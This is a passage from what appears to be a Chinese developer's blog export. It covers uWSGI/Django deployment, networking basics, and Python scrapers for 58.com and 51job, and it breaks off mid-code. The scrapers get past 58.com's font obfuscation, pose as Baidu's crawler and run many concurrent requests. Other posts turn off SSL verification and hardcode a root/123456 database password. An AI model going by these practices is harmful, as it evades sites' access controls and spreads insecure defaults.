时都启动的是框架内置的服务器来运行Web应用程序，而内置的服务器遵循了WSGI协议（WSGI Server）。 WSGI：全称是Web Server Gateway Interface，WSGI不是服务器，python模块，框架，API或者任何软件，只是一种规范，描述web server如何与web application通信的规范。 WSGI server负责从客户端接收请求，将request转发给application，将application返回的response返回给客户端； WSGI application接收由server转发的request，处理请求，并将处理结果返回给server。 要实现WSGI协议，必须同时实现web server和web application，当前运行在WSGI协议之上的web框架有Bottle, Flask, Django。 总结：WSGI是Web 服务器(uWSGI)与 Web 应用程序或应用框架(Django)之间的一种低级别的接口。 2、uWSGI服务器安装WSGI协议下web服务器很多：django内置，uWSGI，gunicorn。 2.1 服务器安装 将uWSGI的tar包发送linux 解压tar：tar -zxvf uwsgi-2.0.17.tar.gz cd到解压目录下，编译：make 为了可以更方便的执行 uwsgi 启动uWSGI服务器，定制链接： ln -s /usr/local/uwsgi-2.0.17/uwsgi /usr/bin/uwsgi 则可以在任意目录下执行 uwsgi 去启动uWSGI服务器 测试使用python的wsgi服务器-uWSGI 在任意的一个目录中定义一个python脚本：hello.py 123def application(env, start_response): start_response(&#x27;200 OK&#x27;, [(&#x27;Content-Type&#x27;,&#x27;text/html;charset=utf-8&#x27;)]) return [bytes(&#x27;你好啊！！&#x27;,&#x27;utf-8&#x27;),b&#x27;Mr_lee&#x27;] # 基于wsgi协议规范实现的代码 启动uWSGI服务器，并部署hello.py程序 uwsgi --http 192.168.248.128:8001 --wsgi-file hello.py #注意hilo.py可以写成绝对路径 浏览器访问：192.168.248.128:8001 3、 uWSGI部署django项目 在数据库中建好项目需要的database：“ems” 使用Navicat创建即可,注意字符集为 utf8 在Django项目的settings.py中修改配置 12345678910111213DEBUG = False #去掉开发模式 ALLOWED_HOSTS = [&quot;*&quot;] #开放访问hostDATABASES = &#123; #合适数据库参数 &#x27;default&#x27;: &#123; &#x27;ENGINE&#x27;: &#x27;django.db.backends.mysql&#x27;, &#x27;NAME&#x27;: &#x27;ems&#x27;, &#x27;USER&#x27;: &#x27;root&#x27;, &#x27;HOST&#x27;: &#x27;localhost&#x27;, &#x27;PORT&#x27;: &#x27;3306&#x27;, &#x27;PASSWORD&#x27;: &#x27;123456&#x27; &#125;&#125; 发送项目到linux并做移植 python manage.py makemigrations python manage.py migrate 编写uWSGI的配置文件 12345678910111213141516171819202122232425#随意找一个目录，创建一个文件：config.ini -- 建议放在项目的根目录下[uwsgi]http = 192.168.134.128:9000 # uWSGI服务器访问地址#uWSGI和nginx通信的portsocket = 192.168.134.128:9001# the base directory (full path)chdir = /usr/local/django_projects/ems #项目所在目录# Django&#x27;s wsgi filewsgi-file = ems/wsgi.py #基于项目目录的相对路径# maximum number of worker processesprocesses = 4#thread numbers startched in each worker processthreads = 2#monitor uwsgi status 通过该端口可以监控 uwsgi 的负载情况stats = 192.168.134.128:9002# clear environment on exitvacuum = truepidfile = /usr/local/django_projects/ems/uwsgi.pid #进程ID存放于此文件，位置可以自定义#daemonize-run ,file-to-record-logdaemonize = /usr/local/django_projects/ems/uwsgi.log #后台启动模式，日志文件记录位置自定义#http://ip:port/static/...请求会进入该目录找资源，此处可以指向某个app下的static目录#或是将所有静态文件汇总到项目的某一个目录下，然后配置在此是更好的选择#汇集所有已安装app的静态资源到一个目录下，请参见后续内容#http://ip:port/static/a/b/c/d.png ==&gt; /usr/local/xxxx/static/a/b/c/d.pngstatic-map =/static=/usr/local/xxx/static # 只在你写的static-map中找静态资源 根据如上配置启动uWSGI服务器 uwsgi --ini config.ini #注意：config.ini是一个相对路径 关闭服务器 uwsgi --stop uwsgi.pid #通过进程id文件 使用uwsgi服务器运行项目后，出现静态资源无法加载的问题 123456# 分析原因： 1.在django内置的服务器中，调试模式，django查找静态资源默认在每个app的static目录 2. 或者可以在setting.py文件中 STATICFILES_DIRS = [os.path.join(BASE_DIR,&#x27;static&#x27;)] 将项目根目录下的static目录作为静态资源的查找路径 # 但是uwsgi服务器有自己的静态资源的处理方式，也就是它不会在上述的两个地方查找静态资源 uwsgi如何处理静态资源 1234567891011121314# 在config.ini配置文件的最后面来告诉uwsgi服务器要在哪里去找静态资源[uwsig]http = xxx:9000socket = xxx:9001.........# 写你的静态资源的绝对路径，如果在项目根目录下，直接写项目根目录/static即可# 如果是每个app自己管理，把所有的app的static目录添加进来，有几个app加几个static-mapstatic-map=/static=/usr/local/xxx/static url可以分为两大类：1. 普通url-动态资源url 会在urls.py文件中匹配访问路径 最终找到视图函数2. 静态资源url-- /static/ 告诉django当url中有/static/时django会在静态资源的目录下去查找资源 如果你的app过多，每个app自己管理静态资源，此时需要添加的static-map太多 123456# 只需要做两步操作就可以把所有app下的静态资源static目录的文件收集到某一个目录下1. 在项目的setting.py文件中添加 STATIC_ROOT=os.path.join(BASE_DIR,&#x27;static&#x27;) 用于告诉django，将来收集到的静态资源往哪里放 2. 执行收集的指令 python manage.py collectstatic STATIC_URL &#x3D; ‘&#x2F;static&#x2F;‘ # 每个静态资源URL的访问前缀 STATICFIELS_DIRS &#x3D; [os.path.join(BASE_DIR,’static’)] # 添加django内置服务器查找静态资源的路径 STATIC_ROOT &#x3D; os.path.join(BASE_DIR,’static’) # 收集静态资源时的路径 static-map&#x3D;&#x2F;static&#x3D;xxxx # 告诉uwsgi服务器到哪里去找静态资源","categories":[],"tags":[{"name":"Nginx","slug":"Nginx","permalink":"http://example.com/tags/Nginx/"}]},{"title":"eval()函数","slug":"eval-函数","date":"2020-10-29T02:44:14.000Z","updated":"2022-04-08T14:29:40.249Z","comments":true,"path":"2020/10/29/eval-函数/","permalink":"http://example.com/2020/10/29/eval-%E5%87%BD%E6%95%B0/","excerpt":"1.eval()函数","text":"1.eval()函数 python中eval()函数用来执行一个字符串的表达式,并返回表达式的值 123456789eval(expression[,globals[,locals]])expression --- 表达式globals -- 变量作用域,全局的命名空间,若提供必须时字典对象locals--变量作用域,可以是任何映射对象返回 表达式计算的结果 javaScript eval()函数 1234567eval(string)函数可以计算某个字符串,并执行其中的JavaScirpt代码string必须,要计算的字符串,其中含有要计算的JavaScript表达式如果参数中没有合法的表达式和语句，则抛出 SyntaxError 异常。如果非法调用 eval()，则抛出 EvalError 异常。如果传递给 eval() 的 Javascript 代码生成了一个异常，eval() 将把该异常传递给调用者。","categories":[],"tags":[{"name":"eval","slug":"eval","permalink":"http://example.com/tags/eval/"}]},{"title":"七层网络结构","slug":"七层网络结构","date":"2020-10-29T00:33:29.000Z","updated":"2022-04-08T14:29:40.265Z","comments":true,"path":"2020/10/29/七层网络结构/","permalink":"http://example.com/2020/10/29/%E4%B8%83%E5%B1%82%E7%BD%91%E7%BB%9C%E7%BB%93%E6%9E%84/","excerpt":"计算机网络七层网络结构","text":"计算机网络七层网络结构 计算机网络七层网络结构7层是指OSI七层协议模型，主要是：应用层（Application）、表示层（Presentation）、会话层（Session）、传输层（Transport）、网络层（Network）、数据链路层（Data Link）、物理层（Physical）。 OSI 模型 主要协议 单位 TCP&#x2F;IP 应用层 Telnet、FTP、HTTP、SNMP等 数据流 应用层 表示层 CSS GIF HTML JSON XML GIF 数据流 会话层 FTP SSH TLS HTTP(S) SQL 数据流 传输层 TCP UDP 数据段 传输层 网络层 IP(IPV4、IPV6) ICMP 数据包 网际层 数据链路层 802.2、802.3ATM、HDLC、 帧 网络接口层 物理层 V.35、EIA&#x2F;TIA-232 比特流 结构名 功能 主要设备 应用层 确定通信对象，提供访问网络服务的接口 网关 表示层 负责数据的编码、转化（界面与二进制数据转换，高级语言与机器语言的转换）数据压缩、解压，加密、解密。根据不同应用目的处理为不同的格式，表现出来就是我们看到的各种各样的文件扩展名。 网关 会话层 负责建立、维护、控制会话单工(Simplex)、半双工(Half duplex)、全双工(Full duplex)三种通信模式的服务 网关 传输层 负责分割、组合数据，实现端到端的逻辑连接三次握手(Three-way handshake)，面向连接(Connection-Oriented)或非面向连接(Connectionless-Oriented)的服务，流控(Flow control)等都发生在这一层。是第一个端到端，即主机到主机的层次。 网关 网络层 负责管理网络地址，定位设备，决定路由 路由器，网桥路由器 数据链路层 负责准备物理传输，CRC校验，错误通知，网络拓扑，流控等 交换机、网桥、网卡 物理层 就是实实在在的物理链路，负责将数据以比特流的方式发送、接收 集线器、中继器,电缆，发送器，接收器 协议间的传输","categories":[],"tags":[{"name":"计算机网络","slug":"计算机网络","permalink":"http://example.com/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"}]},{"title":"requests发送https请求(处理ssl证书验证)","slug":"requests发送https请求-处理ssl证书验证","date":"2020-10-29T00:28:24.000Z","updated":"2022-04-08T14:29:40.265Z","comments":true,"path":"2020/10/29/requests发送https请求-处理ssl证书验证/","permalink":"http://example.com/2020/10/29/requests%E5%8F%91%E9%80%81https%E8%AF%B7%E6%B1%82-%E5%A4%84%E7%90%86ssl%E8%AF%81%E4%B9%A6%E9%AA%8C%E8%AF%81/","excerpt":"requests发送https请求(处理ssl证书验证)","text":"requests发送https请求(处理ssl证书验证) 1、SSL是什么，为什么发送HTTPS请求时需要证书验证？ 1234567891011121.1 SSL：安全套接字层。是为了解决HTTP协议是明文，避免传输的数据被窃取，篡改，劫持等。1.2 TSL：Transport Layer Security，传输层安全协议。TSL其实是SSL标准化后的产物，即SSL／TSL实际上是一个东西。 1.3 HTTPS：HTTPS是兼容HTTP的，可以把HTTPS理解为&#x27;HTTP over TSL&#x27;，即HTTPS是HTTP协议和TSL协议的组合。1.4 HTTPS在传输数据时，同样会先建立TCP连接，建立起TCP连接后，会建立TSL连接. 1.5 请求可以为HTTPS请求验证SSL证书，就像web浏览器一样，SSL验证默认是开启的， 如果证书验证失败，请求会抛出SSLError: 12345&gt;&gt;&gt;import requests&gt;&gt;&gt;requests.get(&#x27;https:xxxx.com&#x27;) #发起一个https请求&gt;&gt;&gt;requests.exceptions.SSLError: xx 1.7 HTTPS请求进行SSL验证或忽略SSL验证才能请求成功，忽略方式为verify=False","categories":[],"tags":[{"name":"requests","slug":"requests","permalink":"http://example.com/tags/requests/"}]},{"title":"让别人连接自己的mysql","slug":"让别人连接自己的mysql","date":"2020-10-15T08:59:24.000Z","updated":"2022-04-08T14:29:40.281Z","comments":true,"path":"2020/10/15/让别人连接自己的mysql/","permalink":"http://example.com/2020/10/15/%E8%AE%A9%E5%88%AB%E4%BA%BA%E8%BF%9E%E6%8E%A5%E8%87%AA%E5%B7%B1%E7%9A%84mysql/","excerpt":"让别人连接自己的mysql","text":"让别人连接自己的mysql 修改mysql中mysql databa下的user表","categories":[],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"http://example.com/tags/Mysql/"}]},{"title":"58同城一线城市买房信息数据可视化","slug":"58同城一线城市买房信息数据可视化","date":"2020-10-13T12:01:50.000Z","updated":"2022-04-08T14:29:40.218Z","comments":true,"path":"2020/10/13/58同城一线城市买房信息数据可视化/","permalink":"http://example.com/2020/10/13/58%E5%90%8C%E5%9F%8E%E4%B8%80%E7%BA%BF%E5%9F%8E%E5%B8%82%E4%B9%B0%E6%88%BF%E4%BF%A1%E6%81%AF%E6%95%B0%E6%8D%AE%E5%8F%AF%E8%A7%86%E5%8C%96/","excerpt":"使用pyecarts进行数据可视化 官方网站 https://gallery.pyecharts.org/#/","text":"使用pyecarts进行数据可视化 官方网站 https://gallery.pyecharts.org/#/ 58同城一线城市买房信息数据可视化1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950# _*_coding:UTF-8 _*_import MySQLdbfrom pyecharts import optionsfrom pyecharts.charts import Bar, Pie, Pagefrom pyecharts.globals import ThemeTypecity_list = [&#x27;北京&#x27;, &#x27;天津&#x27;, &#x27;上海&#x27;, &#x27;南京&#x27;, &#x27;大连&#x27;, &#x27;成都&#x27;, &#x27;无锡&#x27;, &#x27;昆明&#x27;, &#x27;杭州&#x27;, &#x27;武汉&#x27;, &#x27;西安&#x27;, &#x27;重庆&#x27;, &#x27;长沙&#x27;]def select_average_price(): average_list = [] conn = MySQLdb.connect(host=&#x27;localhost&#x27;, user=&#x27;root&#x27;, password=&#x27;123456&#x27;, port=3306, db=&#x27;spider&#x27;, charset=&#x27;utf8&#x27;) cursor = conn.cursor() for city in city_list: sql = &#x27;select every_price from 58tc_xinfang where city=&quot;&#123;&#125;&quot;&#x27;.format(city) cursor.execute(sql) price_list = cursor.fetchall() sum_price = 0 number = len(price_list) for price in price_list: sum_price += int(price[0].replace(&#x27;元/㎡&#x27;, &#x27;&#x27;)) average = sum_price / number average_list.append(format(average, &#x27;.2f&#x27;)) return average_listprice_list = select_average_price()print(price_list)# 柱状图bar_obj = ( Bar(init_opts=options.InitOpts(theme=ThemeType.MACARONS)) \\ .add_xaxis((city_list)) \\ .add_yaxis(&quot;&quot;, price_list) \\ .set_global_opts(title_opts=options.TitleOpts(&quot;买房平均价格元/㎡&quot;, subtitle=&#x27;仅供参考&#x27;), toolbox_opts=options.ToolboxOpts(), # 工具栏选项 brush_opts=options.BrushOpts() # 工具刷对象 ))# 饼状图b_list = [list(i) for i in zip(city_list, price_list)]pie_ogj = ( Pie() .add(&quot;&quot;, b_list) .set_series_opts(label_opts=options.LabelOpts(formatter=&quot;&#123;b&#125;: &#123;c&#125;&quot;)))# page对象用于整合地图p = Page(layout=Page.SimplePageLayout)p.add(pie_ogj, bar_obj)p.render(&quot;一线城市买房信息整合.html&quot;)","categories":[],"tags":[{"name":"爬虫","slug":"爬虫","permalink":"http://example.com/tags/%E7%88%AC%E8%99%AB/"}]},{"title":"58同城一线城市房源信息","slug":"58同城一线城市房源信息","date":"2020-10-13T08:07:58.000Z","updated":"2022-04-08T14:29:40.234Z","comments":true,"path":"2020/10/13/58同城一线城市房源信息/","permalink":"http://example.com/2020/10/13/58%E5%90%8C%E5%9F%8E%E4%B8%80%E7%BA%BF%E5%9F%8E%E5%B8%82%E6%88%BF%E6%BA%90%E4%BF%A1%E6%81%AF/","excerpt":"58同城一线城市房源信息爬取,并存放数据库","text":"58同城一线城市房源信息爬取,并存放数据库 58同城一线城市租房房源信息需要处理58同城的加密字体,买房无加密. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137import requestsimport timeimport base64import pymysqlfrom lxml import etreefrom fontTools.ttLib import TTFontheaders = &#123; &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36&#x27;&#125;# 获取字体文件并转换为xml文件def get_font(page_url, page_num): response = requests.get(url=page_url, headers=headers) # 匹配 base64 编码的加密字体字符串 base64_string = response.text.split(&quot;base64,&quot;)[1].split(&quot;&#x27;&quot;)[0].strip() # print(base64_string) # 将 base64 编码的字体字符串解码成二进制编码 bin_data = base64.decodebytes(base64_string.encode()) # 保存为字体文件 with open(&#x27;58font.woff&#x27;, &#x27;wb&#x27;) as f: f.write(bin_data) print(&#x27;第&#x27; + str(page_num) + &#x27;次访问网页，字体文件保存成功！&#x27;) # 获取字体文件，将其转换为xml文件 font = TTFont(&#x27;58font.woff&#x27;) font.saveXML(&#x27;58font.xml&#x27;) print(&#x27;已成功将字体文件转换为xml文件！&#x27;) return response.text# 将加密字体编码与真实字体进行匹配def find_font(): # 以glyph开头的编码对应的数字 glyph_list = &#123; &#x27;glyph00001&#x27;: &#x27;0&#x27;, &#x27;glyph00002&#x27;: &#x27;1&#x27;, &#x27;glyph00003&#x27;: &#x27;2&#x27;, &#x27;glyph00004&#x27;: &#x27;3&#x27;, &#x27;glyph00005&#x27;: &#x27;4&#x27;, &#x27;glyph00006&#x27;: &#x27;5&#x27;, &#x27;glyph00007&#x27;: &#x27;6&#x27;, &#x27;glyph00008&#x27;: &#x27;7&#x27;, &#x27;glyph00009&#x27;: &#x27;8&#x27;, &#x27;glyph00010&#x27;: &#x27;9&#x27; &#125; # 十个加密字体编码 unicode_list = [&#x27;0x9476&#x27;, &#x27;0x958f&#x27;, &#x27;0x993c&#x27;, &#x27;0x9a4b&#x27;, &#x27;0x9e3a&#x27;, &#x27;0x9ea3&#x27;, &#x27;0x9f64&#x27;, &#x27;0x9f92&#x27;, &#x27;0x9fa4&#x27;, &#x27;0x9fa5&#x27;] num_list = [] # 利用xpath语法匹配xml文件内容 font_data = etree.parse(&#x27;./58font.xml&#x27;) for unicode in unicode_list: # 依次循环查找xml文件里code对应的name result = font_data.xpath(&quot;//cmap//map[@code=&#x27;&#123;&#125;&#x27;]/@name&quot;.format(unicode))[0] # print(result) # 循环字典的key，如果code对应的name与字典的key相同，则得到key对应的value for key in glyph_list.keys(): if key == result: num_list.append(glyph_list[key]) print(&#x27;已成功找到编码所对应的数字！&#x27;) # print(num_list) # 返回value列表 return num_list# 替换掉网页中所有的加密字体编码def replace_font(num, page_response): # 9476 958F 993C 9A4B 9E3A 9EA3 9F64 9F92 9FA4 9FA5 result = page_response.replace(&#x27;&amp;#x9476;&#x27;, num[0]).replace(&#x27;&amp;#x958f;&#x27;, num[1]).replace(&#x27;&amp;#x993c;&#x27;, num[2]).replace( &#x27;&amp;#x9a4b;&#x27;, num[3]).replace(&#x27;&amp;#x9e3a;&#x27;, num[4]).replace(&#x27;&amp;#x9ea3;&#x27;, num[5]).replace(&#x27;&amp;#x9f64;&#x27;, num[6]).replace( &#x27;&amp;#x9f92;&#x27;, num[7]).replace(&#x27;&amp;#x9fa4;&#x27;, num[8]).replace(&#x27;&amp;#x9fa5;&#x27;, num[9]) print(&#x27;已成功将所有加密字体替换！&#x27;) return result# 提取租房信息def parse_pages(pages): num = 0 ele = etree.HTML(pages) city = ele.xpath(&#x27;//head/title/text()&#x27;)[0].split(&#x27;-&#x27;)[1][:-4] title = ele.xpath(&#x27;//h2/a/text()&#x27;) rooms = ele.xpath(&#x27;//div[@class=&quot;des&quot;]/p[@class=&quot;room&quot;]/text()&#x27;) address = ele.xpath(&#x27;//div[@class=&quot;des&quot;]/p[@class=&quot;infor&quot;]/a/text()&#x27;) price = ele.xpath(&#x27;//div[@class=&quot;money&quot;]/b/text()&#x27;) print(len(title)) for i in title: index = title.index(i) try: if title[index] == &#x27;&#x27;: title[index] == &#x27;无&#x27; data = [title[index].split(&#x27;\\n&#x27;)[1].strip(), rooms[index].replace(&#x27; &#x27;, &#x27;&#x27;), address[index * 2] + &quot; &quot; + address[index * 2 + 1], price[index] + &#x27;元/月&#x27;, city] num += 1 except Exception as e: print(e) save_to_mysql(data) print(&#x27;第&#x27; + str(num) + &#x27;条数据爬取完毕，暂停1.5秒！&#x27;) time.sleep(2)# 创建MySQL数据库的表：58tc_datadef create_mysql_table(): db = pymysql.connect(host=&#x27;localhost&#x27;, user=&#x27;root&#x27;, password=&#x27;123456&#x27;, port=3306, db=&#x27;spider&#x27;) cursor = db.cursor() sql = &#x27;CREATE TABLE IF NOT EXISTS 58tc_zufang (title VARCHAR(100) PRIMARY KEY,rooms VARCHAR(255) NOT NULL, address VARCHAR(100) ,price VARCHAR(255),city VARCHAR(255) )&#x27; cursor.execute(sql) db.close()# 将数据储存到MySQL数据库def save_to_mysql(data): db = pymysql.connect(host=&#x27;localhost&#x27;, user=&#x27;root&#x27;, password=&#x27;123456&#x27;, port=3306, db=&#x27;spider&#x27;) cursor = db.cursor() sql = &#x27;INSERT INTO 58tc_zufang(title,rooms,address,price,city) values(%s, %s, %s, %s,%s)&#x27; try: cursor.execute(sql, (data[0], data[1], data[2], data[3], data[4])) db.commit() except Exception as e: print(e) db.rollback() db.close()if __name__ == &#x27;__main__&#x27;: create_mysql_table() print(&#x27;MySQL表58tc_data创建成功！&#x27;) city_list = [&#x27;gz&#x27;, &#x27;zz&#x27;, &#x27;dg&#x27; ,&#x27;fs&#x27;,&#x27;sh&#x27;,&#x27;bj&#x27;,&#x27;nj&#x27;,&#x27;dl&#x27;,&#x27;tj&#x27;,&#x27;nb&#x27;,&#x27;cd&#x27;,&#x27;wx&#x27;,&#x27;hz&#x27;,&#x27;wh&#x27;,&#x27;sy&#x27;,&#x27;sz&#x27;,&#x27;xa&#x27;,&#x27;cq&#x27;,&#x27;cs&#x27;,&#x27;qd&#x27;,] for city in city_list: for i in range(10, 25): url = (&#x27;https://&#123;&#125;.58.com/chuzu/pn&#x27; + str(i) + &#x27;/&#x27;).format(city) print(url) response = get_font(url, i) num_list = find_font() pro_pages = replace_font(num_list, response) parse_pages(pro_pages) print(&#x27;第&#x27; + str(i) + &#x27;页数据爬取完毕！&#x27;) # time.sleep(random.randint(3, 10)) print(&#x27;所有数据爬取完毕！&#x27;) 买房(二手房)1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677# _*_coding:UTF-8 _*_import requestsimport timeimport pymysqlfrom lxml import etreeheaders = &#123; &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36&#x27;&#125;# 提取租房信息def parse_pages(pages): num = 0 ele = etree.HTML(pages) try: city = ele.xpath(&#x27;//head/title/text()&#x27;)[0].split(&#x27;-&#x27;)[1][:-4] title = ele.xpath(&#x27;//h2/a/text()&#x27;) print(len(title)) sum_price = ele.xpath(&quot;//div[@class=&#x27;price&#x27;]/p[@class=&#x27;sum&#x27;]/b/text()&quot;) evey_price = ele.xpath(&quot;//div[@class=&#x27;price&#x27;]/p[@class=&#x27;unit&#x27;]/text()&quot;) except: time.sleep(60 * 5) print(&quot;出现验证码,5分钟后操作&quot;) city = ele.xpath(&#x27;//head/title/text()&#x27;)[0].split(&#x27;-&#x27;)[1][:-4] title = ele.xpath(&#x27;//h2/a/text()&#x27;) print(len(title)) sum_price = ele.xpath(&quot;//div[@class=&#x27;price&#x27;]/p[@class=&#x27;sum&#x27;]/b/text()&quot;) evey_price = ele.xpath(&quot;//div[@class=&#x27;price&#x27;]/p[@class=&#x27;unit&#x27;]/text()&quot;) for i in title: index = title.index(i) try: data = [title[index].split(&#x27;\\/xa0&#x27;)[0], sum_price[index] + &#x27;万&#x27;, evey_price[index], city] num += 1 save_to_mysql(data) print(&#x27;第&#x27; + str(num) + &#x27;条数据爬取完毕，暂停1.5秒！&#x27;) time.sleep(1.5) except Exception as e: print(e)# 创建MySQL数据库的表：58tc_datadef create_mysql_table(): db = pymysql.connect(host=&#x27;localhost&#x27;, user=&#x27;root&#x27;, password=&#x27;123456&#x27;, port=3306, db=&#x27;spider&#x27;) cursor = db.cursor() sql = &#x27;CREATE TABLE IF NOT EXISTS 58tc_xinfang (title VARCHAR(100) PRIMARY KEY,sum_price VARCHAR(255), every_price VARCHAR(100) ,city VARCHAR(255) )&#x27; cursor.execute(sql) db.close()# 将数据储存到MySQL数据库def save_to_mysql(data): db = pymysql.connect(host=&#x27;localhost&#x27;, user=&#x27;root&#x27;, password=&#x27;123456&#x27;, port=3306, db=&#x27;spider&#x27;) cursor = db.cursor() sql = &#x27;INSERT INTO 58tc_xinfang(title,sum_price,every_price,city) values(%s, %s, %s, %s)&#x27; try: cursor.execute(sql, (data[0], data[1], data[2], data[3])) db.commit() except Exception as e: print(e) db.rollback() db.close()if __name__ == &#x27;__main__&#x27;: # create_mysql_table() # print(&#x27;MySQL表58tc_xifang创建成功！&#x27;) city_list = [&#x27;fs&#x27;, &#x27;gz&#x27;, &#x27;zz&#x27;, &#x27;dg&#x27;, &#x27;sh&#x27;, &#x27;bj&#x27;, &#x27;nj&#x27;, &#x27;dl&#x27;, &#x27;tj&#x27;, &#x27;nb&#x27;, &#x27;cd&#x27;, &#x27;wx&#x27;, &#x27;hz&#x27;, &#x27;wh&#x27;, &#x27;sy&#x27;, &#x27;sz&#x27;, &#x27;xa&#x27;, &#x27;cq&#x27;, &#x27;cs&#x27;, &#x27;qd&#x27;] for city in city_list: for i in range(1, 20): url = (&#x27;https://&#123;&#125;.58.com/ershoufang/pn&#x27; + str(i) + &#x27;/&#x27;).format(city) print(url) pro_pages = requests.get(url).text parse_pages(pro_pages) print(&#x27;第&#x27; + str(i) + &#x27;页数据爬取完毕！&#x27;) # time.sleep(random.randint(3, 10)) print(&#x27;所有数据爬取完毕！&#x27;)","categories":[],"tags":[{"name":"爬虫","slug":"爬虫","permalink":"http://example.com/tags/%E7%88%AC%E8%99%AB/"}]},{"title":"进程池和线程池爬取51job","slug":"进程池和线程池爬取51job","date":"2020-10-12T13:28:27.000Z","updated":"2022-04-08T14:29:40.281Z","comments":true,"path":"2020/10/12/进程池和线程池爬取51job/","permalink":"http://example.com/2020/10/12/%E8%BF%9B%E7%A8%8B%E6%B1%A0%E5%92%8C%E7%BA%BF%E7%A8%8B%E6%B1%A0%E7%88%AC%E5%8F%9651job/","excerpt":"python 进程池和线程池学习","text":"python 进程池和线程池学习 进程池和线程池爬取51job进程池爬取1234567891011121314151617181920212223242526from multiprocessing import Pool # 进程池import requestsimport jsonimport redef run(page): print(&quot;开始爬取&quot;) for i in range(1, page): url = &quot;https://search.51job.com/list/010000,000000,0000,00,9,99,%25E9%2594%2580%25E5%2594%25AE,2,&#123;&#125;.html?lang=c&amp;postchannel=0000&amp;workyear=99&amp;cotype=99&amp;degreefrom=99&amp;jobterm=99&amp;companysize=99&amp;ord_field=0&amp;dibiaoid=0&amp;line=&amp;welfare=&quot;.format( i) res = requests.get(url, headers=&#123;&#x27;user-agent&#x27;: &quot;baiduspider&quot;&#125;).text rule = &#x27;__SEARCH_RESULT__ = (.*?)&lt;/script&gt;&#x27; job_dict = json.loads(re.findall(rule, res)[0]) for job in job_dict[&#x27;engine_search_result&#x27;]: if not job[&#x27;providesalary_text&#x27;]: job[&#x27;providesalary_text&#x27;] = &quot;面议&quot; print(job[&#x27;job_name&#x27;], job[&#x27;providesalary_text&#x27;])if __name__ == &#x27;__main__&#x27;: pool = Pool(10) for i in range(100): pool.apply_async(run, (i,)) pool.close() pool.join() print(&quot;爬取结束&quot;) 线程池爬取123456789101112131415161718192021import requestsimport jsonimport refrom concurrent.futures import ThreadPoolExecutordef run(url): print(&quot;开始爬取&quot;) res = requests.get(url, headers=&#123;&#x27;user-agent&#x27;: &quot;baiduspider&quot;&#125;).text rule = &#x27;__SEARCH_RESULT__ = (.*?)&lt;/script&gt;&#x27; job_dict = json.loads(re.findall(rule, res)[0]) for job in job_dict[&#x27;engine_search_result&#x27;]: if not job[&#x27;providesalary_text&#x27;]: job[&#x27;providesalary_text&#x27;] = &quot;面议&quot; print(job[&#x27;job_name&#x27;], job[&#x27;providesalary_text&#x27;])if __name__ == &#x27;__main__&#x27;: pool = ThreadPoolExecutor(max_workers=10) for i in range(1, 1000): url = &quot;https://search.51job.com/list/010000,000000,0000,00,9,99,%25E9%2594%2580%25E5%2594%25AE,2,&#123;&#125;.html?lang=c&amp;postchannel=0000&amp;workyear=99&amp;cotype=99&amp;degreefrom=99&amp;jobterm=99&amp;companysize=99&amp;ord_field=0&amp;dibiaoid=0&amp;line=&amp;welfare=&quot;.format( i) pool.submit(run, url) 注意​ 1、多线程适合IO密集型程序 2、多进程适合CPU密集运算型程序 协程：通俗的讲就是比线程还要小的线程，所以才叫微线程。 协程,也叫微线程,纤程 协程是抽象的–&gt;没有协程对象 协程的作用在于协调程序的执行 如果程序运行过程中出现问题,可以切换到另一个执行线路上. 协程实现的关键点是:挂起 yield 123456优点： 1、使用高并发、高扩展、低性能的；一个CPU支持上万的协程都不是问题。所以很适合用于高并发处理。 2、无需线程的上下文切换开销（乍一看，什么意思呢？我们都知道python实际上是就是单线程，那都是怎么实现高并发操作呢，就是CPU高速的切换，每个任务都干一点，最后看上去是一起完事儿的，肉眼感觉就是多线程、多进程）缺点： 1、无法利用CPU的多核优点，这个好理解，进程里面包含线程，而协程就是细分后的线程，也就是说一个进程里面首先是线程其后才是协程，那肯定是用不了多核了，不过可以多进程配合，使用CPU的密集运算，平时我们用不到。","categories":[],"tags":[{"name":"爬虫","slug":"爬虫","permalink":"http://example.com/tags/%E7%88%AC%E8%99%AB/"}]},{"title":"采集疫情数据并可视化","slug":"采集疫情数据并可视化","date":"2020-10-12T11:27:51.000Z","updated":"2022-04-08T14:29:40.281Z","comments":true,"path":"2020/10/12/采集疫情数据并可视化/","permalink":"http://example.com/2020/10/12/%E9%87%87%E9%9B%86%E7%96%AB%E6%83%85%E6%95%B0%E6%8D%AE%E5%B9%B6%E5%8F%AF%E8%A7%86%E5%8C%96/","excerpt":"采集疫情数据并可视化","text":"采集疫情数据并可视化 采集疫情数据并可视化12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364# _*_coding:UTF-8 _*_import requestsimport jsonimport MySQLdbfrom pyecharts.charts import Map, Bar, Pagefrom pyecharts import options as optsconn = MySQLdb.connect( host=&#x27;localhost&#x27;, port=3306, user=&#x27;root&#x27;, passwd=&#x27;123456&#x27;, db=&#x27;spider&#x27;, charset=&#x27;utf8&#x27;)cursor = conn.cursor()url = &quot;https://view.inews.qq.com/g2/getOnsInfo?name=disease_h5&quot;res = requests.get(url).json()print(res)for province in json.loads(res[&#x27;data&#x27;])[&#x27;areaTree&#x27;]: for province_data in province[&#x27;children&#x27;]: sql = &quot;insert into province values(%s,%s)&quot; cursor.execute(sql, [province_data[&#x27;name&#x27;], province_data[&#x27;today&#x27;][&#x27;confirm&#x27;]]) conn.commit() print(province_data[&#x27;name&#x27;], province_data[&#x27;today&#x27;][&#x27;confirm&#x27;])data = json.loads(res[&#x27;data&#x27;])[&#x27;chinaTotal&#x27;]print(data)sql = &#x27;insert into china_count values(%s,%s,%s,%s)&#x27;cursor.execute(sql, [data[&#x27;confirm&#x27;], data[&#x27;heal&#x27;], data[&#x27;dead&#x27;], 